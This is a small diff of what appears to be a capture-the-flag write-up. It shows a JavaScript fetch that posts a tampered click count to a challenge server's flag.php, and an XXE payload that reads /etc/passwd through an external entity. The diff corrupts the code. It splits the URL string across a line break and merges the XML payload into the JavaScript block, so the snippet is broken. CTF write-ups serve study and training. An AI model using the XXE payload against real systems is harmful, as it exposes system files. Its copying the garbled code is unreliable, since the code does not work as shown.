@@ -6,7 +6,8 @@
 
 ```
 (async () => {
- const baseUrl = "http://challs.crate.nu:50012/";
+ const baseUrl = "http://challs.crate.nu:
+50012/";
  const clickCnt = "1000000000";
  const res = await fetch(baseUrl + "flag.php", {
  method: "POST",
@@ -14,10 +15,5 @@
  });
  console.log(await res.text());
 })();
-```
-
-
-
-```
 <!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]><data>&example;</data>
 ```
